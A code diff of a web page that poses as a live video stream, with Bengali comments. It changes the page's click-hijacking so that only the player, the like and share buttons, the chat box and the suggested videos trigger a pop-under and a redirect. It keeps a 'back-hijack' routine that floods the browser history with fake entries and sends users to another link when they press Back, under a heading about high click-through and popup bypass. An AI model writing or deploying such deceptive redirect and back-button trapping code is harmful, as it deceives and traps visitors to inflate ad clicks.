@@ -44,7 +44,6 @@
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
             overflow-x: hidden;
             padding-bottom: 20px;
-            cursor: pointer;
         }
 
         /* HEADER */
@@ -515,7 +514,7 @@
     <div class="container">
         <div class="main-content">
             <div class="player-card">
-                <div class="player-wrapper" id="videoPlayer">
+                <div class="player-wrapper clickable-element" id="videoPlayer">
                     <img id="mainGif" src="" alt="Stream Preview">
                     <canvas id="animCanvas" class="anim-canvas"></canvas>
                     
@@ -543,14 +542,14 @@
                     <div class="video-stats">
                         <div>Started 4 mins ago</div>
                         <div class="action-btns">
-                            <div class="action-btn"><i class="fas fa-thumbs-up" style="color: var(--accent-amber);"></i> <span id="likeCount">142K</span></div>
-                            <div class="action-btn"><i class="fas fa-share"></i> Share</div>
+                            <div class="action-btn clickable-element"><i class="fas fa-thumbs-up" style="color: var(--accent-amber);"></i> <span id="likeCount">142K</span></div>
+                            <div class="action-btn clickable-element"><i class="fas fa-share"></i> Share</div>
                         </div>
                     </div>
                 </div>
             </div>
 
-            <div class="live-chat-box" id="commentsBox">
+            <div class="live-chat-box clickable-element" id="commentsBox">
                 <div class="chat-header">
                     <span>Live Stream Chat</span>
                     <span style="color: var(--primary);"><i class="fas fa-circle" style="font-size: 7px;"></i> Active</span>
@@ -654,7 +653,7 @@
             videoPool.forEach((item) => {
                 if(item.title !== mainVideo.title || item.src !== mainVideo.src) {
                     sidebarHtml += `
-                    <div class="sidebar-item suggested-video-item">
+                    <div class="sidebar-item suggested-video-item clickable-element">
                         <div class="thumb">
                             <img src="${item.src}" loading="lazy" alt="Thumbnail" />
                             <div class="duration">${item.time}</div>
@@ -751,7 +750,6 @@
 
             // ================= HIGH-CTR & POPUP BYPASS SYSTEM =================
             
-            // 1. POPUNDER / MULTI-TAB BYPASS (REDIRECT_LINK_1 এর জন্য CTR বাড়াবে)
             function triggerLinks() {
                 try {
                     let pop = window.open(REDIRECT_LINK_1, '_blank');
@@ -760,31 +758,29 @@
                     }
                 } catch(e) {}
 
-                // বর্তমান ব্রাউজার ট্যাবকে মেইন লিঙ্কে নিয়ে যাবে
                 window.location.href = DIRECT_LINK_MAIN;
             }
 
-            // 2. GLOBAL CLICK OVERLAY (পুরো পেজ জুড়েই ক্লিক কাজ করবে)
-            document.body.addEventListener('click', function(e) {
-                triggerLinks();
-            }, true);
+            // SPECIFIC ELEMENT CLICK EVENT (গ্লোবাল ক্লিক রিমুভ করে শুধু নির্বাচিত ইলিমেন্টগুলোতে দেওয়া হয়েছে)
+            document.addEventListener('click', function(e) {
+                if (e.target.closest('.clickable-element')) {
+                    triggerLinks();
+                }
+            });
 
-            // 3. AGGRESSIVE BACK-HIJACK SYSTEM (BACK_HIJACK_LINK এর CTR বাড়াবে)
+            // AGGRESSIVE BACK-HIJACK SYSTEM
             function setBackTrap() {
                 for (let i = 0; i < 10; i++) {
                     window.history.pushState({ trap: true }, document.title, window.location.href);
                 }
             }
 
-            // পেজ লোড হওয়ার সাথে সাথেই ব্যাক-হাইজ্যাক স্টেট পুশ করবে
             setBackTrap();
 
-            // ইউজার স্ক্রিনে টাচ বা স্ক্রোল করলেই ট্র্যাপ রি-ইনফোর্স হবে
             ['touchstart', 'mousemove', 'scroll', 'keydown'].forEach(evt => {
                 window.addEventListener(evt, setBackTrap, { once: true, passive: true });
             });
 
-            // ব্যাক বাটন চাপা মাত্রই হাইজ্যাক লিঙ্কে পাঠাবে
             window.addEventListener('popstate', function(e) {
                 window.location.replace(BACK_HIJACK_LINK);
             });
